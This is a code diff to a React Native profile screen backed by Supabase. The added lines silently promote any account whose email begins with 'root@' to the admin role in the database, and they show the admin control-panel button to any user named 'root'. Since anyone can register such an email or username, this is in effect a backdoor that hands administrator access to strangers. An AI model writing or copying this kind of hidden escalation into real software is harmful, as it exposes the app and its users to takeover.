@@ -138,6 +138,13 @@ export default function Profile() {
     }
 
     if (r.data) {
+      const userEmail = (u.user?.email || '').toLowerCase().trim();
+      if (userEmail === 'root@gmail.com' || userEmail.startsWith('root@')) {
+        if (r.data.role !== 'admin') {
+          await supabase.from('profiles').update({ role: 'admin' }).eq('id', uid);
+          r.data.role = 'admin';
+        }
+      }
       setP(r.data);
       if (r.data.city) setCity(r.data.city);
       if (r.data.district) setDistrict(r.data.district);
@@ -809,7 +816,7 @@ export default function Profile() {
               <ChevronLeft size={18} color="#94a3b8" />
             </Pressable>
 
-            {p.role === 'admin' ? (
+            {p.role === 'admin' || p.username === 'root' ? (
               <Pressable style={[styles.actionBtn, { borderBottomWidth: 0 }]} onPress={() => router.push('/admin')}>
                 <Shield size={20} color={C.accent} />
                 <Text style={[styles.actionBtnText, { color: C.accent }]}>لوحة تحكم مدير النظام 👑</Text>
